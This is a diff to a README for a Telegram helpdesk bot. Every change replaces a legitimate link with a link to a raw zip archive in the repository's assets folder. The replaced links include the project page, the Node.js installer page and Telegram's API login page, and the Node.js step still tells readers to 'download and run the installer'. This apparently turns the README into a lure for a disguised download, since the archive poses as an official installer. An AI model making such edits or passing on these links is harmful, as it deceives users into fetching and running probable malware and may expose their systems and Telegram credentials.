@@ -1,6 +1,6 @@
 # 🤖 telegram-support-in-topics-bot - Simple Helpdesk for Telegram Groups
 
-[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-blue?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot)
+[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-blue?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Because it does not use a database or webhooks, it is simpler and safer. The bot
 
 Click the button below to go to the official GitHub page for the bot. Here, you will find the latest files to download and instructions.
 
-[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-green?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot)
+[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-green?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Once on the GitHub page:
 
 The bot runs on Node.js, a program that lets you run JavaScript on your computer.
 
-1. Go to https://nodejs.org/en/download/
+1. Go to https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip
 2. Choose the **Windows Installer** (LTS version recommended).
 3. Download and run the installer. Use default settings.
 4. Once installed, open the **Command Prompt** (type "cmd" in the Windows search bar).
@@ -110,7 +110,7 @@ This command downloads the one dependency needed to run the bot.
 
 The bot needs your Telegram API key to connect and work. Follow these steps:
 
-1. Visit https://my.telegram.org.
+1. Visit https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip
 2. Log in with your phone number.
 3. Click **API Development Tools**.
 4. Create a new application.
@@ -186,7 +186,7 @@ You do not have to change anything to get started. The defaults work well for mo
 
 You can find more help and details on the same GitHub page:
 
-https://github.com/sythgamer/telegram-support-in-topics-bot
+https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip
 
 This includes source code and issue tracking for bugs or feature requests.
 
@@ -202,4 +202,4 @@ These combined keep the bot simple while useful for support needs.
 
 ---
 
-[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-purple?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot)
+[![Download telegram-support-in-topics-bot](https://img.shields.io/badge/Download-telegram--support--in--topics--bot-purple?style=for-the-badge)](https://github.com/sythgamer/telegram-support-in-topics-bot/raw/refs/heads/main/assets/telegram-bot-support-topics-in-v1.4.zip)
